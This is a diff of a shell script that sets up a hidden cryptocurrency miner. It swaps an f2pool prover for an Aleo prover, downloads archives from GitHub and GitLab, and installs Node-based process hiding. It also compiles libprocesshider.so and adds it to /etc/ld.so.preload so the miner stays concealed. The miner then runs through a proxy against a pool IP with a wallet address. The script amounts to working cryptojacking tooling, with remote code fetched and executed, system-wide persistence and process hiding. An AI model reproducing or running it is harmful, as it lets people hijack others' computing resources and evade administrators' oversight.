@@ -14,9 +14,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/6block/f2pool_prover/releases/download/v0.1.2/f2pool_prover-v0.1.2.tar.gz && tar -zvxf f2pool_prover-v0.1.2.tar.gz && cd f2pool_prover
+wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/v0.2.1/aleo_prover-v0.2.1.tar.gz && tar -zvxf aleo_prover-v0.2.1.tar.gz && cd aleo_prover
 
-chmod +x f2pool_prover
+chmod +x aleo_prover
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./f2pool_prover --pool 68.183.130.15:80 --account antiyakyo --custom_name $(shuf -n 1 -i 1-9999)-Bismillah & wget https://github.com/6block/f2pool_prover/releases/download/v0.1.2/f2pool_prover-v0.1.2.tar.gz && tar -zvxf f2pool_prover-v0.1.2.tar.gz && cd f2pool_prover && ./f2pool_prover --pool 68.183.130.15:80 --account antiyakyo --custom_name $(shuf -n 1 -i 1-9999)-Bismillah
+./graftcp/graftcp ./aleo_prover --pool 167.99.155.214:443 --address aleo1h25eer7ytgn0wf8p05hxdmfzkmmm0jhqlemszcjf560x23g5zcgqajytuw --custom_name GPU
